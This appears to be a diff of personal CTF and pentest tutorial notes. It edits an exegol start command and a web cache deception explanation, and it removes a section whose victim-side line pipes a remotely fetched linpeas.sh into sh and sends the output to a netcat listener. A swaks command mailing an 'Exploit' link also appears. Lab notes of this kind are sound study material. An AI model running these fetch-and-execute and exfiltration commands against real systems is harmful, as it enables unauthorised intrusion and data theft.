@@ -1,7 +1,7 @@
 # Tuto
 
 ```bash
-exegol start -cwd -fs --disable-shared-timezones CTF2
+exegol start -cwd -fs --disable-shared-timezones CTF
 ```
 
 ## Discovery
@@ -159,7 +159,7 @@ You can also use double URL Encoding
 
 ### Web cache deception
 
-Send a malicious URL and have the cache storing a dynamic response. You can then send a request to get the content of this precise data.
+Send a malicious URL and have the cache storing a dynamic response. You can then send a request to get the content of this precise data (ie request what have been saved in the cache).
 
 Mostly on `HEAD`, `GET` and `OPTION`. `X-Cache` header provides information about whether a response was served from the cache.
 
@@ -326,17 +326,6 @@ With the following command you can send emails to a server that is not password 
 
 ```bash
 swaks --to jobert@localhost --from axel@localhost --header "Subject: Exploit" --body "http://localhost:3000/axel/test" --server 127.0.0.1
-```
-
-### Linepas usage send and back
-
-```bash
-# Host on two sparate terminal
-python3 -m http.server 8000 > /dev/null |
-nc -lvnp 9002 | tee <bos_name>/linpeas.out
-
-# Victim
-curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002
 ```
 
 ## Active Directory
